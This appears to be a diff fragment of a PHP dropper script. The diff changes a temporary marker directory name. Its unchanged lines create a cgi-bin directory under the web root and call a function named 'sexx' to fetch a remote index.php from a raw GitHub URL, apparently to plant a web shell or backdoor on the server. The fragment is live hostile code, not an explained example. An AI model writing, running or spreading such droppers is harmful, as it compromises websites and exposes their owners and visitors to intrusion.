@@ -5,8 +5,8 @@ echo('Eec secra');  }
 
 $random = rand(1,6);
 $d=$_SERVER['SERVER_NAME'];
-if(file_exists('/tmp/dfgdfg4ggbbbb'.$d.$random)) { } else {
-	mkdir('/tmp/dfgdfg4ggbbbb'.$d.$random);
+if(file_exists('/tmp/h64h46h4'.$d.$random)) { } else {
+	mkdir('/tmp/h64h46h4'.$d.$random);
 	mkdir($_SERVER['DOCUMENT_ROOT']."/cgi-bin");
 	
 $rr = sexx('https://raw.githubusercontent.com/Hrecc/Re/main/index.php');
